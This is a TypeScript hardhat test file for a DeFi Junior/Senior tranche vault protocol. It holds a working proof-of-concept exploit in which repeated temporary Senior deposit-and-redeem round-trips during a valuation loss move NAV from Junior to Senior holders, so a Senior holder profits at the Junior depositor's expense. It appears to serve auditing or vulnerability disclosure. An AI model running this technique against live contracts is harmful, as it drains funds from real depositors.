import { UTest } from 'atma-utest'
import { $hh } from '../tranches/utils/$hh'
import { $erc4626 } from '../tranches/utils/$erc4626'
import { $require } from 'dequanto/utils/$require'
import { $test } from '../tranches/utils/$test'
import { $strata } from '../tranches/utils/$strata'
import { $ethena } from '../tranches/utils/$ethena'
import { DYSAccounting } from '@0xc/hardhat/DYSAccounting/DYSAccounting'

const WAD = 10n ** 18n

const test = await $hh.deploy('ethena', {
    cdoInfo: {
        ContractVersions: { accounting: 'dys' }
    },
})

const accounting = test.tranches.accounting as any as DYSAccounting
const { deployer } = test
const { cdo, jrtVault, srtVault, sUSDe } = test.tranches
const victim = await test.createAccount('valuation-victim')
const seniorLong = await test.createAccount('valuation-senior-long')
const tempCapital = await test.createAccount('valuation-temp-capital')

UTest.create({
    async $before() {
        await cdo.$receipt().setValuationKeeper(deployer, deployer.address)
        await $strata.disableAPRs(test.factory)
        await $ethena.setCooldownDuration(sUSDe, deployer, 0)
        await test.snapshot('valuation-funded-roundtrip')
    },

    async $teardown() {
        await test.reset('valuation-funded-roundtrip')
    },

    async $after() {
        await test.wipe()
    },

    async 'control: valuation recovery restores factual Junior and Senior NAV without redemptions'() {
        await $erc4626.deposit(jrtVault, victim, 200)
        await $erc4626.deposit(srtVault, seniorLong, 100)

        await cdo.$receipt().setValuationPrice(deployer, 5n * 10n ** 17n)

        $test.eqDiff(await jrtVault.totalAssets(), 100n * WAD, 1n)
        $test.eqDiff(await srtVault.totalAssets(), 200n * WAD, 1n)

        await cdo.$receipt().setValuationPrice(deployer, WAD)

        $test.eqDiff(await jrtVault.totalAssets(), 200n * WAD, 1n)
        $test.eqDiff(await srtVault.totalAssets(), 100n * WAD, 1n)
    },

    async 'attack: temporary Senior round-trips crystallize virtual Junior coverage into factual Senior NAV'() {
        const victimShares = await $erc4626.deposit(jrtVault, victim, 200)
        const seniorLongShares = await $erc4626.deposit(srtVault, seniorLong, 100)

        await cdo.$receipt().setValuationPrice(deployer, 5n * 10n ** 17n)

        // setValuationPrice() automatically pauses Senior deposits on first loss entry.
        // This models the protocol's documented post-grace active-market regime where
        // a PAUSER reopens public Senior deposits; the attacker itself has no role.
        await cdo.$receipt().setActionStates(deployer, srtVault.address, true, true)

        const factualJrtBefore = await accounting.jrtBaseNav()
        const factualSrtBefore = await accounting.srtBaseNav()

        $test.eqDiff(factualJrtBefore, 200n * WAD, 1n)
        $test.eqDiff(factualSrtBefore, 100n * WAD, 1n)
        $test.eqDiff(await jrtVault.totalAssets(), 100n * WAD, 1n)
        $test.eqDiff(await srtVault.totalAssets(), 200n * WAD, 1n)

        // Reuse the same 100 assets as temporary capital. Each deposit mints new
        // Senior shares at the current effective PPS; redeem only those new shares.
        // Effective prices stay stable, but factual NAV migrates JRT -> SRT.
        for (let i = 0; i < 20; i++) {
            const temporaryShares = await $erc4626.deposit(srtVault, tempCapital, 100)
            const returnedAssets = await $erc4626.redeem(srtVault, tempCapital, temporaryShares)

            $test.eqDiff(returnedAssets, 100n * WAD, 1_000n, `temporary principal must round-trip in loop ${i}`)
            $require.eq(await srtVault.balanceOf(tempCapital.address), 0n, `temporary shares must be fully burned in loop ${i}`)

            $test.eqDiff(await jrtVault.totalAssets(), 100n * WAD, 10_000n, `effective JRT NAV changed in loop ${i}`)
            $test.eqDiff(await srtVault.totalAssets(), 200n * WAD, 10_000n, `effective SRT NAV changed in loop ${i}`)
        }

        const factualJrtAfter = await accounting.jrtBaseNav()
        const factualSrtAfter = await accounting.srtBaseNav()

        $require.eq(factualJrtAfter < factualJrtBefore, true, 'round-trips must permanently reduce factual Junior NAV')
        $require.eq(factualSrtAfter > factualSrtBefore, true, 'round-trips must permanently increase factual Senior NAV')

        // Recovery removes the virtual valuation adjustment. Any factual NAV migration
        // caused by the round-trips now becomes directly withdrawable by remaining holders.
        await cdo.$receipt().setValuationPrice(deployer, WAD)

        const seniorRecoveredNav = await srtVault.totalAssets()
        const juniorRecoveredNav = await jrtVault.totalAssets()

        $require.eq(seniorRecoveredNav > 100n * WAD, true, 'Senior retained Junior valuation coverage after recovery')
        $require.eq(juniorRecoveredNav < 200n * WAD, true, 'Junior failed to recover its virtual valuation coverage')

        // Prove the accounting shift is withdrawable, not merely a view discrepancy.
        const attackerPayout = await $erc4626.redeem(srtVault, seniorLong, seniorLongShares)
        const victimPayout = await $erc4626.redeem(jrtVault, victim, victimShares)

        const attackerProfit = attackerPayout - 100n * WAD
        const victimLoss = 200n * WAD - victimPayout

        $require.eq(attackerProfit > 0n, true, 'pre-existing Senior holder must realize positive profit')
        $require.eq(victimLoss > 0n, true, 'Junior holder must realize a matching loss')
        $test.eqDiff(attackerProfit, victimLoss, 100_000n, 'attacker profit should be funded by Junior loss')

        console.log('attackerProfit', attackerProfit.toString())
        console.log('victimLoss', victimLoss.toString())
        console.log('factualSrtBefore', factualSrtBefore.toString())
        console.log('factualSrtAfter', factualSrtAfter.toString())
        console.log('factualJrtBefore', factualJrtBefore.toString())
        console.log('factualJrtAfter', factualJrtAfter.toString())
    },
})
